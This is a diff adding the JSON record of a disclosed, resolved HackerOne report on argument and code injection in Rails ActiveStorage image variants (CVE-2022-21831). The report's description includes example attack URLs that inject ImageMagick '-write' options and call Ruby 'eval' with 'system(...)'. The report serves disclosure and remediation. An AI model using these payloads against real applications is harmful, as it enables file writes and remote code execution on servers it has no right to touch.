@@ -1,0 +1,127 @@
+{
+  "id": 1154034,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTU0MDM0",
+  "url": "https://hackerone.com/reports/1154034",
+  "title": "Argument/Code Injection via ActiveStorage's image transformation functionality",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-04-07T03:05:50.031Z",
+  "submitted_at": "2021-04-07T03:05:50.107Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gquadros_",
+    "url": "/gquadros_",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-21831"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-07-28T00:45:12.641Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-06-28T00:45:10.236Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Affected components\n\nTested on:\n\n1. activestorage 6.1.3.1\n2. image\\_processing 1.12.1\n3. mini\\_magick 4.11.0\n\n# Found by\n\nGabriel Quadros and Ricardo Silva from Conviso Application Security\n\n# Description\n\n## Intro\n\nActiveStorage has an image transformation functionality [1, 2, 3, 4, 5, 6] which uses the concept of *variants*. By their own words [5]:\n\n> Image blobs can have variants that are the result of a set of transformations applied to the original. These variants are used to create thumbnails, fixed-size avatars, or any other derivative image from the original.\n\n> Variants rely on ImageProcessing gem for the actual transformations of the file, so you must add gem \"image\\_processing\" to your Gemfile if you wish to use variants. By default, images will be processed with ImageMagick using the MiniMagick gem, but you can also switch to the libvips processor operated by the ruby-vips gem).\n\nOne example of direct usage can be seen in the docs as:\n\n```ruby\n<%= image_tag user.avatar.variant(resize_to_limit: [100, 100]) %>\n```\n\nThis will create an image tag with a variant URL, which when visited will return the *avatar* image transformed to the new size.\n\nAnother example uses the *preview()* method, which can be used to generate images from videos and PDF files. Once the preview image is generated, it also calls *variant()* under the hood.\n\n```html\n<ul>\n  <% @message.files.each do |file| %>\n    <li>\n      <%= image_tag file.preview(resize_to_limit: [100, 100]) %>\n    </li>\n  <% end %>\n</ul>\n```\n\n## Vulnerabilities\n\nFirst, it is worth noting that the docs [3, 4, 7] do not state anything about it being insecure to pass user-supplied values as arguments to the *variant()/preview()* methods.\n\nRails uses the gem ImageProcessing [8] with MiniMagick by default, passing the transformations to the *apply* method.\n\n**File:** activestorage/lib/active\\_storage/transformers/image\\_processing\\_transformer.rb\n```ruby\n 12 module ActiveStorage                                                          \n 13   module Transformers                                                         \n 14     class ImageProcessingTransformer < Transformer                            \n 15       private                                                                 \n 16         def process(file, format:)                                            \n 17           processor.                                                          \n 18             source(file).                                                     \n 19             loader(page: 0).                                                  \n 20             convert(format).                                                  \n 21             apply(operations).                                                \n 22             call                                                              \n 23         end\n```\n\nThis method passes these operations to the *builder* object by iterating over them and calling methods providing arguments, as can be seen below.\n\n**File:** lib/image\\_processing/chainable.rb\n```ruby\n 24     # Add multiple operations as a hash or an array.                          \n 25     #                                                                         \n 26     #   .apply(resize_to_limit: [400, 400], strip: true)                      \n 27     #   # or                                                                  \n 28     #   .apply([[:resize_to_limit, [400, 400]], [:strip, true])               \n 29     def apply(operations)                                                     \n 30       operations.inject(self) do |builder, (name, argument)|                  \n 31         if argument == true || argument == nil                                \n 32           builder.send(name)                                                  \n 33         elsif argument.is_a?(Array)                                           \n 34           builder.send(name, *argument)                                       \n 35         elsif argument.is_a?(Hash)                                            \n 36           builder.send(name, **argument)                                      \n 37         else                                                                  \n 38           builder.send(name, argument)                                        \n 39         end                                                                   \n 40       end                                                                     \n 41     end\n```\n\nAt some point, ImageProcessing passes these operations to MiniMagick via method calling as well:\n\n**File:** lib/image\\_processing/processor.rb\n```ruby\n 51     # Calls the operation to perform the processing. If the operation is      \n 52     # defined on the processor (macro), calls the method. Otherwise calls the \n 53     # operation directly on the accumulator object. This provides a common    \n 54     # umbrella above defined macros and direct operations.                    \n 55     def apply_operation(name, *args, &block)                                  \n 56       receiver = respond_to?(name) ? self : @accumulator                      \n 57                                                                               \n 58       if args.last.is_a?(Hash)                                                \n 59         kwargs = args.pop                                                     \n 60         receiver.public_send(name, *args, **kwargs, &block)                   \n 61       else                                                                    \n 62         receiver.public_send(name, *args, &block)                             \n 63       end                                                                     \n 64     end\n```\n\nMiniMagick receives these operations by defining a *method\\_missing* method, which takes the called methods and convert them to CLI options:\n\n**File:** lib/mini\\_magick/tool.rb\n```ruby\n260     ##                                                                        \n261     # Any undefined method will be transformed into a CLI option              \n262     #                                                                         \n263     # @example                                                                \n264     #   mogrify = MiniMagick::Tool.new(\"mogrify\")                             \n265     #   mogrify.adaptive_blur(\"...\")                                          \n266     #   mogrify.foo_bar                                                       \n267     #   mogrify.command.join(\" \") # => \"mogrify -adaptive-blur ... -foo-bar\"  \n268     #                                                                         \n269     def method_missing(name, *args)                                           \n270       option = \"-#{name.to_s.tr('_', '-')}\"                                   \n271       self << option                                                          \n272       self.merge!(args)                                                       \n273       self                                                                    \n274     end\n```\n\n### Argument Injection\n\nThe first problem arrises when a user-supplied value is passed as input to a hard-coded transformation, such as:\n\n```ruby\n<%= image_tag user.avatar.variant(resize: params[:new_size]) %>\n```\n\nSince Rails *params[]* can be an array, one thing the attacker could do here is to pass an array and inject arbitrary arguments into the command to be executed (ImageMagick's convert by default).\n\nExample:\n\n```\nhttps://example.com/controller?new_size[]=123&new_size[]=-set&new_size[]=comment&new_size[]=MYCOMMENT&new_size[]=-write&new_size[]=/tmp/file.erb\n```\n\nThis is going to generate the following command:\n\n```\nconvert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png\n```\n\nWhich has the effect of writing a file containing user-controlled data anywhere in the system. This could be used easily to achieve RCE against Rails applications by overwriting ERB files, for example.\n\n### User-controlled transformation\n\nA second problem arrises when the user is also allowed to choose the kind of transformation to be applied, such as:\n\n```ruby\n<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>\n```\n\nThis is still dangerous since ImageMagick's convert program has a lot of powerful command-line options and they can be used to compromise the application. For example, the user could pass:\n\n```\nhttps://example.com/controller?t=write&v=/tmp/file2.erb\n```\n\nThis is going to generate the following command:\n\n```\nconvert ORIGINAL_IMAGE -auto-orient -write /tmp/file2.erb /tmp/image_processing20210328-23426-63rmm2.png\n```\n\nWhich has a similar effect as the previous attack, if we consider the original image is usually user-controlled.\n\n### Code Injection\n\nThe third problem occurs due the way ImageProcessing passes the operations to the *builder* object (via *send()*). There is no filtering to check if the called method is a valid operation and this can be explored by an attacker to execute code.\n\nConsider the same pattern as before:\n\n```ruby\n<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>\n```\n\nThe attacker could pass:\n\n```\nhttps://example.com/controller?t=eval&v=system(\"touch /tmp/hacked\")\n```\n\nAnd the Ruby code *system(\"touch /tmp/hacked\")* would be executed.\n\n# Recomendations\n\n1. Add some notes in the documentation to warn developers about the dangers of passing user-supplied data to the affected methods (*variant/preview*) without sanitization;\n2. Fix the argument injection problem;\n3. Implement an operations whitelist in ImageProcessing, so it won't call unexpected methods.\n\n# References\n\n1. https://guides.rubyonrails.org/active_storage_overview.html#transforming-images\n2. https://guides.rubyonrails.org/active_storage_overview.html#previewing-files\n3. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-variant\n4. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-preview\n5. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Variant.html\n6. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Preview.html\n7. https://github.com/rails/rails/issues/32989\n8. https://github.com/janko/image_processing\n\n## Impact\n\nVulnerable code patterns could allow the attacker to achieve RCE.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-07-28T00:45:10.382Z",
+  "allow_singular_disclosure_after": -87834094.34582385,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "orange303",
+    "zy9ard3",
+    "ubercomp",
+    "0xpaier",
+    "neilx",
+    "kerolesmagdy",
+    "sujal_meghwal",
+    "vlakhani28",
+    "shivammusic",
+    "prit3shh",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
